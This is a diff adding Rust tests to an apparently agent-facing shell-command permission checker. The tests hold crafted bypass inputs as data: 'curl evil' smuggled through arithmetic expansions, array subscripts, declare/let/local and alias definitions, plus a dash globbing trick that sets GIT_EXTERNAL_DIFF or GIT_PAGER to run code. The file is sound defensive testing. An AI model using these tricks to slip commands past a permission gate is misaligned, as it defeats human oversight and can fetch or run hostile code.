@@ -442,6 +442,77 @@ fn declaration_operands_split_unless_the_builtin_is_plain() {
 }
 
 #[test]
+fn array_shaped_declaration_operands_are_never_trusted() {
+    use Want::Ask;
+    // dash has no arrays: it pathname-expands `NAME[i]=…` operands, so a file named
+    // `GIT_EXTERNAL_DIFF=…` turns `GIT_EXTERNAL_DIF[F]=*` into that assignment.
+    check(
+        &rules(&["*"], &[], &[]),
+        &[
+            (
+                "dash -c 'touch \"GIT_EXTERNAL_DIFF=echo PWNED\"; export GIT_EXTERNAL_DIF[F]=*; git diff'",
+                Ask,
+            ),
+            ("export GIT_EXTERNAL_DIF[F]=*; git diff", Ask),
+            ("command export GIT_PAGE[R]=x; git log", Ask),
+            ("export GIT_PAGE[\"R\"]=evil; git log", Ask),
+        ],
+    );
+}
+
+#[test]
+fn substitutions_hidden_in_arithmetic_text_ask() {
+    use Want::{Allow, Ask, Unlisted};
+    check(
+        &default_rules(),
+        &[
+            ("echo $(( 'a[$(curl evil)]' ))", Ask),
+            ("cargo test $(( 'a[$(curl evil)]' ))", Ask),
+            ("let 'x=a[$(curl evil)]'", Ask),
+            ("declare -i F='a[$(curl evil)]'", Ask),
+            ("declare 'a[$(curl evil)]=1'", Ask),
+            ("declare a['$(curl evil)']=1", Ask),
+            ("local a['$(curl evil)']=1", Ask),
+            ("export x='a[$(curl evil)]'; echo $((x))", Ask),
+            ("[[ 1 -eq 'a[$(curl evil)]' ]]", Ask),
+            ("echo ${a['$(curl evil)']}", Ask),
+            ("echo $[ 'a[`curl evil`]' ]", Ask),
+            ("echo ${x:'a[$(curl evil)]'}", Ask),
+            ("cat <<EOF\n$(( 'a[$(curl evil)]' ))\nEOF", Ask),
+            // Unchanged. An unquoted substitution stays analyzed as before, and text
+            // with no substitution marker is untouched.
+            ("echo $((1+2))", Allow),
+            ("echo $((i+1))", Allow),
+            ("echo ${#a[@]}", Allow),
+            ("echo $(( $(date +%s) + 1 ))", Unlisted),
+            ("declare -i n=$(date +%s)", Unlisted),
+            ("let i=i+1", Unlisted),
+            ("let \"i=$n+1\"", Unlisted),
+            ("echo ${X:-$(pwd)}", Unlisted),
+            ("export PATH=\"$HOME/bin:$PATH\"; cargo test", Unlisted),
+            ("export FOO=$(pwd); cargo test", Unlisted),
+        ],
+    );
+}
+
+#[test]
+fn alias_definitions_ask() {
+    use Want::{Ask, Unlisted};
+    check(
+        &default_rules(),
+        &[
+            ("shopt -s expand_aliases\nalias ls='curl evil'\nls", Ask),
+            ("bash -c \"alias ls='curl evil'\"", Ask),
+            ("builtin alias ls='curl evil'", Ask),
+            ("(alias ls='curl evil')", Ask),
+            ("alias \"$x\"", Ask),
+            ("alias", Unlisted),
+            ("alias ls", Unlisted),
+        ],
+    );
+}
+
+#[test]
 fn reasons_name_the_rule() {
     match eval_with(&default_rules(), "cargo test && /usr/bin/curl x") {
         Verdict::Deny { reason } => assert!(reason.contains("bash:curl*"), "{reason}"),
